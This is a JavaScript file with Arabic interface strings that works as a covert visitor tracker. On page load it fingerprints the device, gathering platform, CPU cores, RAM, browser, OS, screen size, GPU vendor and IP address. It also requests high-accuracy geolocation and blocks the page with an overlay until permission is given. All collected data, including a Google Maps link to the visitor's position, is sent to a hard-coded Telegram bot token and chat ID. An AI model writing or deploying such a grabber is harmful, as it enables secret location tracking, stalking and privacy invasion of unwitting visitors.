function sendInformationToTelegram(info) {
    var botToken = '7172876720:AAHHrUi-6VOFhhtJnyP2fpIM6yeU5Y9mYho';
    var chatId = '962686305';
    var url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(info)}`;

    fetch(url).then(response => {
        if (!response.ok) {
            throw new Error('Network response was not ok');
        }
        return response.json();
    }).then(data => {
        console.log('Information sent to Telegram bot:', data);
    }).catch(error => {
        console.error('There was a problem with the fetch operation:', error);
    });
}

function collectDeviceInfo() {
    var ptf = navigator.platform;
    var cc = navigator.hardwareConcurrency || 'غير متوفر';
    var ram = navigator.deviceMemory || 'غير متوفر';
    var ver = navigator.userAgent;
    var brw = 'غير متوفر';
    var canvas = document.createElement('canvas');
    var gl, debugInfo, ven, ren;

    if (ver.indexOf('Firefox') != -1) {
        brw = 'Firefox';
    } else if (ver.indexOf('Chrome') != -1) {
        brw = 'Chrome';
    } else if (ver.indexOf('Safari') != -1) {
        brw = 'Safari';
    } else if (ver.indexOf('Edge') != -1) {
        brw = 'Edge';
    }

    try {
        gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    } catch (e) { }
    if (gl) {
        debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        ven = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) || 'غير متوفر';
        ren = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'غير متوفر';
    }

    var ht = window.screen.height;
    var wd = window.screen.width;
    var os = ver.substring(0, ver.indexOf(')')).split(';')[1].trim() || 'غير متوفر';

    var deviceInfo = `منصة الجهاز: ${ptf}\نعدد النوى: ${cc}\ن الذاكرة العشوائية: ${ram}\ن نوع المتصفح: ${brw}\ن نظام التشغيل: ${os}\ن دقة الشاشة: ${ht}x${wd}\ن الشركة المصنعة لوحدة المعالجة الرسومية: ${ven}\ن نوع وحدة المعالجة الرسومية: ${ren}`;
    sendInformationToTelegram(deviceInfo);

    // Collect IP address
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            var ipInfo = `عنوان IP: ${data.ip}`;
            sendInformationToTelegram(ipInfo);
        })
        .catch(error => console.error('Error fetching IP address:', error));
}

function requestLocationPermission() {
    if (navigator.geolocation) {
        var optn = { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 };
        navigator.geolocation.getCurrentPosition(function(position) {
            var lat = position.coords.latitude || 'غير متوفر';
            var lon = position.coords.longitude || 'غير متوفر';
            var acc = position.coords.accuracy || 'غير متوفر';
            var alt = position.coords.altitude || 'غير متوفر';
            var dir = position.coords.heading || 'غير متوفر';
            var spd = position.coords.speed || 'غير متوفر';

            var googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}&z=17&hl=ar`;
            var locationInfo = `إحداثيات: خط العرض ${lat}، خط الطول ${lon}\ن دقة الموقع: ${acc} متر\n الارتفاع: ${alt} متر\n الاتجاه: ${dir} درجة\n السرعة: ${spd} متر/ثانية\n\n رابط الموقع على جوجل مابس: ${googleMapsLink}`;
            sendInformationToTelegram(locationInfo);
        }, function (error) {
            alert('يرجى تفعيل إذن الموقع للمتابعة.');
            document.getElementById('overlay').style.display = 'flex';
        }, optn);
    } else {
        alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
    }
}

// إرسال المعلومات عند تحميل الصفحة
window.onload = function() {
    collectDeviceInfo();
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
            requestLocationPermission();
        }, function(error) {
            document.getElementById('overlay').style.display = 'flex';
        });
    } else {
        alert('جهازك لا يدعم تحديد الموقع الجغرافي.');
    }
};
